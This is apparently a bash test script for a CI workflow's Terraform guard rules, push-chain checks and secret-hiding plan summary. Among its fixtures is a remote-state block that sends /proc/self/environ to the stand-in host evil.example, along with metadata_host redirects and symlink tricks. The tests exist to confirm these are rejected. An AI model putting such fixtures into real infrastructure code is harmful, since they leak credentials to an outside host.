#!/usr/bin/env bash
# Tests of the guard logic in .github/workflows/terraform-plan.yml (caersid
# #602). The scripts under test are extracted from the workflow itself, so the
# tests run exactly the text the pinned workflow runs:
#   - the gate's push-chain verdict (jq);
#   - plan-summary.sh: names only, instance keys hidden;
#   - tier-rules.sh: the rules on what Terraform would load, against a
#     throwaway git repository shaped like caersid's tiers.
# Also shellchecks every extracted script when shellcheck is installed.
#
#   tests/terraform-plan/run.sh [workflow file]
#
# Needs bash, git, jq, yq (mikefarah, v4) and awk. Exit 0 when every test passes.
set -euo pipefail

here=$(cd "$(dirname "$0")" && pwd)
wf=${1:-$here/../../.github/workflows/terraform-plan.yml}
[ -f "$wf" ] || { echo "no workflow at $wf" >&2; exit 2; }
work=$(mktemp -d "${TMPDIR:-/tmp}/terraform-plan-tests.XXXXXX")
trap 'rm -rf "$work"' EXIT

pass=0 fails=0
ok() { pass=$((pass + 1)); }
bad() { fails=$((fails + 1)); echo "FAIL: $1"; }
# expect <name> <want> <got>: got must start with want.
expect() { if [[ $3 == "$2"* ]]; then ok; else bad "$1: want '$2', got '$3'"; fi; }

# --- Extraction ---------------------------------------------------------------
scripts=$(yq '.jobs.plan.steps[] | select(.name == "Write the plan scripts") | .run' "$wf")
[ -n "$scripts" ] || { echo "the 'Write the plan scripts' step was not found" >&2; exit 2; }
extract() { # <name>: the heredoc that writes $bin/<name>.sh
  awk -v s="$1" '
    $0 == "cat > \"$bin/" s ".sh\" <<'"'"'SCRIPT'"'"'" { on = 1; next }
    on && $0 == "SCRIPT" { on = 0; next }
    on { print }' <<<"$scripts" > "$work/$1.sh"
  [ -s "$work/$1.sh" ] || { echo "could not extract $1.sh" >&2; exit 2; }
  chmod +x "$work/$1.sh"
}
for s in plan-summary check-identity tier-rules plan-tier; do extract "$s"; done

gate=$(yq '.jobs.gate.steps[0].run' "$wf")
verdict_prog=$(awk '
  /verdict=\$\(jq -r/ { on = 1; sub(/.*--argjson pid "\$PLAN_PERSON_ID" \x27/, ""); print; next }
  on && /\x27 <<<"\$events"/ { sub(/\x27 <<<"\$events".*/, ""); print; on = 0; next }
  on { print }' <<<"$gate")
[ -n "$verdict_prog" ] || { echo "could not extract the push-chain verdict" >&2; exit 2; }

if command -v shellcheck > /dev/null 2>&1; then
  if shellcheck -S warning "$work"/*.sh; then ok; else bad "shellcheck of the extracted scripts"; fi
fi

# --- Push chain ---------------------------------------------------------------
G=146720324
Z=0000000000000000000000000000000000000000
A=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
C=cccccccccccccccccccccccccccccccccccccccc
REF=refs/heads/feat/x
ev() { # type before after actor_id actor_type timestamp [ref]
  jq -cn --arg t "$1" --arg b "$2" --arg a "$3" --argjson id "$4" --arg ty "$5" --arg ts "$6" --arg r "${7:-$REF}" \
    '{activity_type: $t, before: $b, after: $a, ref: $r, timestamp: $ts, actor: {login: "x", id: $id, type: $ty}}'
}
chain() { jq -r --arg head "$1" --arg ref "$REF" --argjson pid "$G" "$verdict_prog" <<<"$2"; }
e1=$(ev branch_creation $Z $A $G User 2026-11-18T10:00:00Z)
e2=$(ev push $A $B $G User 2026-11-18T10:05:00Z)
e3=$(ev force_push $B $C $G User 2026-11-18T10:10:00Z)
expect "chain: valid" "ok 3" "$(chain $C "[$e3,$e2,$e1]")"
expect "chain: creation only" "ok 1" "$(chain $A "[$e1]")"
expect "chain: head not newest" "the newest push is not" "$(chain $B "[$e3,$e2,$e1]")"
expect "chain: empty" "no push history" "$(chain $A '[]')"
expect "chain: bot push" "a push by x (Bot)" "$(chain $C "[$e3,$(ev push $A $B 999 Bot 2026-11-18T10:05:00Z),$e1]")"
expect "chain: other person" "a push by x (User)" "$(chain $C "[$e3,$(ev push $A $B 42 User 2026-11-18T10:05:00Z),$e1]")"
nullactor=$(jq -cn --arg a $B --arg b $A --arg r $REF '{activity_type: "push", before: $b, after: $a, ref: $r, timestamp: "2026-11-18T10:05:00Z", actor: null}')
expect "chain: null actor" "a push by an unknown actor" "$(chain $C "[$e3,$nullactor,$e1]")"
expect "chain: gap" "a gap in the push chain" "$(chain $C "[$e3,$e1]")"
expect "chain: no creation" "the chain does not reach" "$(chain $C "[$e3,$e2]")"
expect "chain: merge event" "a pr_merge event" "$(chain $C "[$e3,$(ev pr_merge $A $B $G User 2026-11-18T10:05:00Z),$e1]")"
expect "chain: substring type" "a pus event" "$(chain $C "[$e3,$(ev pus $A $B $G User 2026-11-18T10:05:00Z),$e1]")"
expect "chain: out of order" "pushes out of order" "$(chain $C "[$e3,$(ev push $A $B $G User 2026-11-18T10:20:00Z),$e1]")"
expect "chain: creation from a commit" "a branch creation from a commit" "$(chain $B "[$e2,$(ev branch_creation $C $A $G User 2026-11-18T10:00:00Z)]")"
expect "chain: other ref" "an event for another ref" "$(chain $C "[$e3,$(ev push $A $B $G User 2026-11-18T10:05:00Z refs/heads/other),$e1]")"
expect "chain: recreated branch" "ok 2" "$(chain $B "[$e2,$e1,$(ev push $A $B 999 Bot 2026-11-17T10:05:00Z)]")"
expect "chain: malformed sha" "an event without commit ids" "$(chain $B "[$(ev push $A $B $G User 2026-11-18T10:05:00Z),$(ev push nothex $A $G User 2026-11-18T10:01:00Z),$e1]")"

# --- Summary ------------------------------------------------------------------
plan='{"format_version":"1.2","resource_changes":[
  {"address":"azurerm_key_vault_secret.s","mode":"managed","change":{"actions":["update"],"before":{"name":"s","value":"TOPSECRET"},"after":{"name":"s","value":"NEWSECRET"}}},
  {"address":"azurerm_storage_account.a[\"KEYSECRET\"]","mode":"managed","change":{"actions":["create"],"before":null,"after":{"name":"a"}}},
  {"address":"azurerm_storage_account.b[\"a]b SPLITSECRET\"]","mode":"managed","change":{"actions":["create"],"before":null,"after":{"name":"b"}}},
  {"address":"azurerm_storage_account.c[2]","mode":"managed","change":{"actions":["delete"],"before":{"name":"c"},"after":null}},
  {"address":"data.x.y","mode":"data","change":{"actions":["read"]}}],
  "resource_drift":[{"address":"azurerm_role_assignment.r[\"DRIFTSECRET\"]","mode":"managed","change":{"actions":["update"],"before":{"x":1},"after":{"x":2}}}],
  "output_changes":{"o":{"actions":["update"],"before":"OLDOUT","after":"NEWOUT"}}}'
out=$("$work/plan-summary.sh" platform <<<"$plan")
if grep -E 'TOPSECRET|NEWSECRET|KEYSECRET|SPLITSECRET|DRIFTSECRET|OLDOUT|NEWOUT' <<<"$out" > /dev/null; then bad "summary: a value or key leaks"; echo "$out"; else ok; fi
expect "summary: heading" "#### platform tier" "$out"
for want in 'Plan: 2 to add, 1 to change, 1 to destroy.' '| update | `azurerm_key_vault_secret.s` | value |' \
            '| create | `azurerm_storage_account.a[…]` |' '| create | `azurerm_storage_account.b[…]` |' \
            '| delete | `azurerm_storage_account.c[2]` |' '| update | `azurerm_role_assignment.r[…]` | x |' 'Outputs: update `o`'; do
  if grep -F -- "$want" <<<"$out" > /dev/null; then ok; else bad "summary: missing '$want'"; fi
done
rc=0; "$work/plan-summary.sh" platform <<<'not json' > /dev/null 2>&1 || rc=$?
expect "summary: not a plan" 3 "$rc"
rc=0; "$work/plan-summary.sh" identity <<<"$plan" > /dev/null 2>&1 || rc=$?
expect "summary: unknown tier" 2 "$rc"

# --- Tier rules ---------------------------------------------------------------
repo="$work/repo"
tier="$repo/infrastructure/terraform/compute"
mkdir -p "$tier" "$repo/infrastructure/terraform/environments"
cat > "$tier/versions.tf" <<'TF'
terraform {
  required_version = ">= 1.14.0, < 2.0.0"
  required_providers {
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 5.12.0"
    }
  }
}

provider "azurerm" {
  subscription_id = var.subscription_id
  features {}
}
TF
cat > "$tier/backend.tf" <<'TF'
terraform {
  backend "azurerm" {}
}
TF
cat > "$tier/main.tf" <<'TF'
data "terraform_remote_state" "platform" {
  backend = "azurerm"
  config = {
    key = "caersid/platform-production.tfstate"
  }
}

resource "azurerm_resource_group" "this" {
  name     = "rg"
  location = "uksouth"
}
TF
cat > "$tier/storage.tf" <<'TF'
resource "azurerm_storage_account" "this" {
  name = "st"
}
TF
printf 'provider "registry.terraform.io/hashicorp/azurerm" {\n  version = "5.12.0"\n}\n' > "$tier/.terraform.lock.hcl"
printf 'subscription_id = "x"\n' > "$repo/infrastructure/terraform/environments/compute-production.tfvars"
git -C "$repo" init -q
git -C "$repo" -c user.name=t -c user.email=t@example.invalid add -A
git -C "$repo" -c user.name=t -c user.email=t@example.invalid commit -q -m base
base=$(git -C "$repo" rev-parse HEAD)
reset() { git -C "$repo" checkout -q -- . && git -C "$repo" clean -qfdx; }
rules() { # <name> <want exit> [want reason prefix]: after the mutation in the working tree
  local rc=0 reason
  reason=$(BASE_SHA=$base RUNNER_TEMP=$work "$work/tier-rules.sh" compute "$repo" 2>&1) || rc=$?
  if [ "$rc" = "$2" ] && [[ $reason == "${3:-}"* ]]; then ok; else bad "rules: $1: want exit $2 ${3:+'$3…'}, got exit $rc '$reason'"; fi
  reset
}

rules "unchanged" 0 "ok:"
printf '\nresource "azurerm_storage_container" "c" {\n  name = "c"\n}\n' >> "$tier/storage.tf"
rules "harmless addition" 0 "ok:"
sed -i.bak 's/"rg"/"rg2"/' "$tier/main.tf" && rm "$tier/main.tf.bak"
rules "harmless change beside remote state" 0 "ok:"
{ printf 'provider "azurerm" {\n  alias         = "x"\n  metadata_host = "evil.example"\n}\n'; for _ in $(seq 1 20000); do echo '# padding padding padding padding'; done; } > "$tier/aaa.tf"
rules "new provider block, then a large file" 3 "aaa.tf adds"
awk '{ print } /^provider "azurerm"/ { print "  metadata_host = \"evil.example\"" }' "$tier/versions.tf" > "$tier/v" && mv "$tier/v" "$tier/versions.tf"
rules "metadata_host in the existing provider block" 3 "versions.tf adds"
printf 'data "terraform_remote_state" "x" {\n  backend = "http"\n  config = { address = "https://evil.example/${file("/proc/self/environ")}" }\n}\n' > "$tier/evil.tf"
rules "http remote state" 3 "evil.tf adds"
sed -i.bak 's/backend = "azurerm"/backend = "http"/' "$tier/main.tf" && rm "$tier/main.tf.bak"
rules "remote state backend changed" 3 "main.tf adds"
printf 'module x {\n  source = "./m"\n}\n' >> "$tier/storage.tf"
rules "bare-label module" 3 "storage.tf has a module block"
printf 'module"x"{\n  source = "./m"\n}\n' >> "$tier/storage.tf"
rules "module without spaces" 3 "storage.tf has a module block"
ln -s ../environments/compute-production.tfvars "$tier/link.tf"
rules "symbolic link .tf" 3 "the tier contains a symbolic link"
rm "$repo/infrastructure/terraform/environments/compute-production.tfvars" && ln -s /etc/hosts "$repo/infrastructure/terraform/environments/compute-production.tfvars"
rules "symbolic link tfvars" 3 "the tier's tfvars file is a symbolic link"
printf '*.tf -diff\n' > "$repo/.gitattributes"
printf 'provider "azurerm" {\n  alias = "y"\n}\n' >> "$tier/storage.tf"
rules ".gitattributes -diff with a provider" 3 "storage.tf adds"
mv "$tier/versions.tf" "$tier/providers.tf"
rules "renamed versions.tf" 3 "providers.tf adds"
rm "$tier/backend.tf"
rules "removed backend.tf" 3 "backend.tf adds"
printf '\n' >> "$tier/.terraform.lock.hcl"
rules "lock file changed" 3 "the tier's .terraform.lock.hcl differs"
mkdir -p "$tier/terraform.d/plugins"
rules "terraform.d" 3 "the tier has an override file"
printf '{}\n' > "$tier/x.tf.json"
rules ".tf.json" 3 "the tier has an override file"
printf 'resource "x" "y" {}\n' > "$tier/storage_override.tf"
rules "override file" 3 "the tier has an override file"
printf 'output "e" {\n  value = azurerm_storage_account.this.primary_web_endpoint\n}\n' >> "$tier/storage.tf"
rules "a line naming an endpoint" 3 "storage.tf adds"
awk 'NR == 1 { first = $0; next } { print } END { print first }' "$tier/main.tf" > "$tier/m" && mv "$tier/m" "$tier/main.tf"
rules "risky line moved within its file" 0 "ok:"
rc=0; BASE_SHA=$base "$work/tier-rules.sh" identity "$repo" > /dev/null 2>&1 || rc=$?
expect "rules: unknown tier" 2 "$rc"
rc=0; BASE_SHA=nope "$work/tier-rules.sh" compute "$repo" > /dev/null 2>&1 || rc=$?
expect "rules: no base" 2 "$rc"

echo "passed $pass, failed $fails"
[ "$fails" -eq 0 ]
